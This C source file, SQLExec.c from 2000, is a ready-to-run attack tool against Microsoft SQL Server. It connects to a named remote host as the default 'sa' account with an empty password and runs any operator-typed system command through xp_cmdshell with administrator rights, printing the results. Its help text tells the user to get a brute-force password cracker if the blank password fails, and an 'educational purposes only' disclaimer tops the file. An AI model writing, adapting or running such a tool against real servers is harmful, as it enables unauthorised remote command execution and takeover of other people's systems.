/******************************************************************
SQLExec.c
This file is for educational purposes only.
If you are planning to use it for another purpose
use it with your own responsibility.I have no responsibility.
It is written in Visual C++ 6.0.
It depends on the stored proc. xp_cmdshell.By default SQL server
is installed with Adminisrative privilege.So it executes command as 
Administrator.It can be used either locally or remotely(Only if port 1433 is open)
It uses default sa account with NULL password.But this can be modified easily.
USAGE : SQLExec www.target.com
Copyright (c) 2000,Egemen Tas egemen@btkom.com or egement@karyde.com.tr
Feel free to contact with me at these mail.
*******************************************************************/
#include <stdio.h>
#include <windows.h>
#include <wchar.h>
#include <sql.h>
#include <sqlext.h>
#include <lmcons.h>


int main(int argc, char *argv[])
{
	SQLCHAR Host[512]="";
	SQLCHAR *User=";UID=sa";
	SQLCHAR *Pass=";PWD=";
	SQLCHAR *Database="";
	SQLCHAR InConnectionString[1025]="";
	SQLCHAR rowBuff[200]="";
	SQLINTEGER   iRowBuff;
	UCHAR Query[1500]="";
	UCHAR Cmd[300]="";
	char inBuff[1025]="";	
	SQLRETURN nResult;
	SWORD     sLen;
	SQLHDBC   hDbc;         
	HSTMT  hStmt;
	SQLHANDLE hEnvironment;
	int retries = 0;
	if(argc !=2)
	{
		printf("\n\n-------------SQLExec 1.0 for Windows NT/2K/9X-------------\n\nBy Egemen Tas (Send all feedbacks and bug reports to egemen@btkom.com)\n\n");
		printf("\nUsage : SQLExec <Hostname> \n!!!!(Do not use ip addresses of targets)!!!!\n");
		return 0;
	}
	printf("\n\n-------------SQLExec 1.0 for Windows NT/2K/9X----------------\n\nBy Egemen Tas (Send all feedbacks and bug reports to egemen@btkom.com)\n\n");
	memset(Query,0,1499);
	strcpy(Host,argv[1]);
	sprintf(InConnectionString,"DRIVER={SQL Server};SERVER=%s%s%s%s",Host,User,Pass,Database);
	
	if (SQLAllocHandle(SQL_HANDLE_ENV,SQL_NULL_HANDLE,&hEnvironment) != SQL_SUCCESS)
	{
			printf("SQLAllocHandle returned an error!\n");
			return 0;
	}

	if (SQLSetEnvAttr(hEnvironment, SQL_ATTR_ODBC_VERSION,(SQLPOINTER)
						SQL_OV_ODBC3, SQL_IS_INTEGER) != SQL_SUCCESS)
	{
			printf("SQLSetEnvAttr returned an error!\n");
			return 0;

	}

	if ((nResult = SQLAllocHandle(SQL_HANDLE_DBC,hEnvironment,(SQLHDBC FAR*)&hDbc)) != SQL_SUCCESS) 
		{
			printf("SQLAllocHandle returned an error!\n");
			return 0;
		}

	while(retries < 4)
	{
	nResult = SQLDriverConnect(hDbc,NULL, InConnectionString,
									strlen(InConnectionString), 
									inBuff,  1024, &sLen,
									SQL_DRIVER_COMPLETE_REQUIRED);      
	if(nResult == SQL_SUCCESS || nResult == SQL_SUCCESS_WITH_INFO)
	{
			printf("Ok.You have connected to MASTER database...\n");
			SQLAllocStmt(hDbc,&hStmt);
			break;
	}
	else
	{
		if(retries == 3)
		{
			printf("\nCould not connect to the SQL Server on the target!\n\nMake sure you use !!HOSTNAME NOT IP!!\n"
			"If you are using dial-up connection retry for a few times.\n"
			"If you are sure that SQL server is installed on the target check that port 1433 is open.\n"
			"If port 1433 is open and you have tried several times to connect, then probably SA does not have a NULL password.\n"
			"Get a SQL server brute force cracker , try to hack passwords and try again.\n"
			"If you are a script kiddy then go (www.technotronic.com or packetstorm.securify.com) , find some documents , read them at least 1 year and try again.:))");
		
		return 0;
		}
		retries++;
		printf("Performing retry(%d)...\n",retries);
		Sleep(5000);
	}
	}
	printf("Now type dos command(s) to execute :");
	fgets(Cmd,299,stdin);
	Cmd[strlen(Cmd)-1]='\0';
	sprintf(Query,"EXEC master..xp_cmdshell \"%s\"",Cmd);
	printf("Trying to execute %s on the target\n",Cmd);
	if(SQLExecDirect(hStmt,Query,SQL_NTS) != SQL_SUCCESS)
	{
		printf("An error occured while performing your query."
			"This does not mean that your command is unsuccesfull...\n"
			"Check the result.If it didnt work then \n"
			"make sure you did not use duplicate keywords with ODBC api\n or the target does not have ' xp_cmdshell ' stored procedure.");
		return 0;
	}
	while (nResult != SQL_ERROR) 
	{
      memset(rowBuff,0,99);
	  nResult = SQLFetch(hStmt);
      if (nResult == SQL_ERROR || nResult == SQL_SUCCESS_WITH_INFO) 
	  {
         printf("Error while fething the results from the stored proc.\n");
      }
      if (nResult == SQL_SUCCESS || nResult == SQL_SUCCESS_WITH_INFO){


         SQLGetData(hStmt, 1, SQL_C_CHAR, rowBuff, 100, &iRowBuff);
         printf("%s \n",rowBuff);
      } else 
	  {
         break;
      }
	}
	SQLFreeHandle(SQL_HANDLE_DBC,&hDbc);
	SQLFreeHandle(SQL_HANDLE_ENV,&hEnvironment);
	SQLFreeHandle(SQL_HANDLE_STMT,&hStmt);

return 0;
}

